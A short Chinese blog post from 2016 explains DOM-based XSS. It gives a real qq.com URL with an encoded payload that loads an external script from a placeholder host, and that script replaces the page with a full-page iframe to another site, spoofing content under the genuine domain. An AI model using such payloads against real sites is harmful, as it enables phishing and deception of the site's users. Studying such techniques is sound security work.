---
layout: post
title: "DOM XSS"
date: 2016-08-03 11:04:09 +0800
comments: true
categories: security
---
因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面

<!--more-->

http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E

![](http://jason5.cn/images/xss-dom.png)

page解码后为

```javascript
"><script src="http://xxxx.com/yy.js"></script>
```

yy.js的内容

```javascript
function window.onload(){
	parent.document.title="XSS test";
    parent.document.bgColor="black";
    parent.document.fgColor="white";
    parent.document.body.innerHTML="<iframe src='http://www.qqdx.albbz.cn/' width='100%' height='100%'>";
}
```

原始页面内容
http://app.2008.qq.com/ppzj/view_dh.php?page=1

![](http://jason5.cn/images/xss-dom1.png)